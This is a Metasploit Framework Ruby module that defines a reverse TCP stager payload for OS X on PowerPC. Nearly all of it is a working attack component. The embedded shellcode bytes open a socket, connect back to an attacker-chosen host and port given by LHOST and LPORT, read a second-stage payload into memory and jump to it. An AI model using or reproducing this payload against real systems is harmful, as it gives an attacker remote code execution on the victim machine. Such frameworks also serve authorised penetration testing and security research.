require 'msf/core'
require 'msf/core/handler/reverse_tcp'

module Msf
module Payloads
module Stagers
module Osx
module Ppc

###
#
# ReverseTcp
# ----------
#
# OSX reverse TCP stager.
#
###
module ReverseTcp

	include Msf::Payload::Stager

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse TCP Stager',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to the attacker',
			'Author'        => 'hdm',
			'License'       => GPL_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_PPC,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Stager'        =>
				{
					'Offsets' =>
						{
							'LPORT' => [ 34, 'n'    ],
							'LHOST' => [ 36, 'ADDR' ],
						},
					'Payload' =>
						"\x38\x60\x00\x02\x38\x80\x00\x01\x38\xa0\x00\x06\x38\x00\x00\x61" +
						"\x44\x00\x00\x02\x7c\x00\x02\x78\x7c\x7e\x1b\x78\x48\x00\x00\x0d" +
						"\x00\x02\x10\xe1\x7f\x00\x00\x01\x7c\x88\x02\xa6\x38\xa0\x00\x10" +
						"\x38\x00\x00\x62\x7f\xc3\xf3\x78\x44\x00\x00\x02\x7c\x00\x02\x78" +
						"\x38\x00\x00\x03\x7f\xc3\xf3\x78\x38\x81\xe0\x00\x38\xa0\x20\x00" +
						"\x7c\x88\x03\xa6\x44\x00\x00\x02\x7c\x00\x02\x78\x4e\x80\x00\x20" +
						"\x7c\x00\x02\x78"
				}
			))
	end

end

end end end end end
